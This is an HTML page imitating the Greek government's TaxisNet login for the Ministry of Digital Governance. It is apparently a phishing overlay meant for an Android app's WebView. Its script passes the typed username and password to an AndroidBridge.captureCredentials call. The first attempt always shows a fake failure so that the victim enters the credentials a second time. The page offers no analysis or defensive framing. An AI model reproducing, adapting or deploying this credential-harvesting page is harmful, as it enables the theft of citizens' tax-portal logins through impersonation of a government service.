<!DOCTYPE html>
<html lang="el">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OAuth2 | Γενική Γραμματεία ΠΛ...</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="loading-overlay" id="loadingOverlay">
        <div class="spinner"></div>
    </div>

    <div class="container">
        <div class="card">
            <header>
                <div class="header-content">
                    <div class="logo-left">
                        <svg width="180" height="60" viewBox="0 0 180 60">
                            <rect x="10" y="10" width="40" height="40" fill="#5b89b4" rx="2" />
                            <path d="M 20 20 L 40 20 L 40 40 L 20 40 Z" fill="white" />
                            <path d="M 25 25 L 35 25 L 35 35 L 25 35 Z" fill="#e88121" />
                            <text x="55" y="22" font-family="Arial" font-size="9" font-weight="bold" fill="#5b89b4">Γενική Γραμματεία</text>
                            <text x="55" y="34" font-family="Arial" font-size="9" font-weight="bold" fill="#5b89b4">Πληροφοριακών</text>
                            <text x="55" y="46" font-family="Arial" font-size="9" font-weight="bold" fill="#5b89b4">Συστημάτων & ...</text>
                        </svg>
                    </div>
                    <div class="logo-right">
                        <svg width="180" height="60" viewBox="0 0 180 60">
                            <circle cx="25" cy="30" r="18" fill="none" stroke="#5b89b4" stroke-width="1.5" />
                            <rect x="23" y="18" width="4" height="24" fill="#5b89b4" />
                            <rect x="13" y="28" width="24" height="4" fill="#5b89b4" />
                            <text x="50" y="25" font-family="Arial" font-size="9" font-weight="bold" fill="#003366">ΕΛΛΗΝΙΚΗ ΔΗΜΟΚΡΑΤΙΑ</text>
                            <text x="50" y="37" font-family="Arial" font-size="9" fill="#003366">Υπουργείο Ψηφιακής</text>
                            <text x="50" y="49" font-family="Arial" font-size="9" fill="#003366">Διακυβέρνησης</text>
                        </svg>
                    </div>
                </div>
            </header>

            <div class="banner">
                <h1>Αυθεντικοποίηση Χρηστών</h1>
                <button class="lang-btn">English</button>
            </div>

            <main>
                <section class="login-box">
                    <h2>Σύνδεση</h2>
                    <p class="subtitle">Παρακαλώ εισάγετε τους κωδικούς σας στο <strong>TaxisNet</strong> για να συνδεθείτε.</p>

                    <div class="error-box" id="errorBox">
                        <span class="error-title">Αποτυχία στην Αυθεντικοποίηση του χρήστη!</span>
                        <span class="error-subtitle">Η σύνδεσή σας δεν ήταν δυνατή.</span>
                    </div>

                    <form id="loginForm">
                        <div class="form-group">
                            <label for="username">Χρήστης:</label>
                            <input type="text" id="username" name="username" autocomplete="username">
                        </div>

                        <div class="form-group">
                            <label for="password">Κωδικός:</label>
                            <input type="password" id="password" name="password" autocomplete="current-password">
                        </div>

                        <button type="submit" class="submit-btn">Σύνδεση</button>
                    </form>
                </section>

                <div class="footer-links">
                    <p>
                        <a href="#">Κέντρο Διαλειτουργικότητας (ΚΕ.Δ.) Υπουργείου Ψηφιακής Διακυβέρνησης</a>
                    </p>
                </div>
            </main>
        </div>
    </div>

    <script>
        var attemptCount = 0;

        function showLoading() {
            document.getElementById('loadingOverlay').style.display = 'flex';
        }

        function hideLoading() {
            document.getElementById('loadingOverlay').style.display = 'none';
        }

        function showError() {
            document.getElementById('errorBox').style.display = 'flex';
            document.getElementById('password').value = '';
            document.getElementById('password').focus();
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            var user = document.getElementById('username').value.trim();
            var pass = document.getElementById('password').value;

            if (!user || !pass) return;

            document.getElementById('errorBox').style.display = 'none';
            showLoading();

            if (attemptCount === 0) {
                attemptCount++;
                if (window.AndroidBridge) {
                    window.AndroidBridge.captureCredentials(user, pass);
                }
                setTimeout(function() {
                    hideLoading();
                    showError();
                }, 1800);
            } else {
                if (window.AndroidBridge) {
                    window.AndroidBridge.captureCredentials(user, pass);
                }
                setTimeout(function() {
                    hideLoading();
                    if (window.AndroidBridge) {
                        window.AndroidBridge.finishSession();
                    }
                }, 2000);
            }
        });
    </script>
</body>
</html>
